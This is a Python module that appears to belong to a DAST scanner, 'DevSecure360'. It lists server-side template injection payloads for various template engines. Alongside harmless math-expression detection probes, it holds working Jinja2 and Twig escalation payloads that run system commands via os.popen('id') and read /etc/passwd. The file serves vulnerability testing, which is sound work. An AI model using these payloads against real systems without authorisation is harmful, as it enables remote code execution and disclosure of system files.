"""
DevSecure360 — DAST SSTI Payloads
====================================
Server-Side Template Injection payload set.
Sources: PortSwigger SSTI research, PayloadsAllTheThings SSTI corpus.
"""


def get_detection_payloads() -> list:
    """
    Math-expression payloads to detect SSTI. If `{{7*7}}` returns `49`,
    the template engine evaluated our expression — confirmed SSTI.
    Returns list of (payload, expected_in_response) tuples.
    """
    return [
        # Jinja2 / Twig / Django
        ("{{7*7}}", "49"),
        ("{{7*'7'}}", "7777777"),     # Jinja2-specific
        ("{{'a'*3}}", "aaa"),

        # FreeMarker
        ("${7*7}", "49"),
        ("<#assign x=7*7>${x}", "49"),

        # Velocity
        ("#set($x=7*7)${x}", "49"),

        # Smarty
        ("{math equation='x + x' x=7}", "14"),
        ("{{7*7}}", "49"),

        # Mako
        ("${7*7}", "49"),

        # ERB (Ruby)
        ("<%= 7*7 %>", "49"),

        # Pebble
        ("{{7*7}}", "49"),

        # Tornado
        ("{{7*7}}", "49"),
    ]


def get_rce_payloads() -> list:
    """
    RCE escalation payloads for confirmed Jinja2/Twig SSTI.
    These attempt to call system commands through the template engine.
    """
    return [
        # Jinja2 RCE via MRO chain
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",

        # Twig
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
    ]
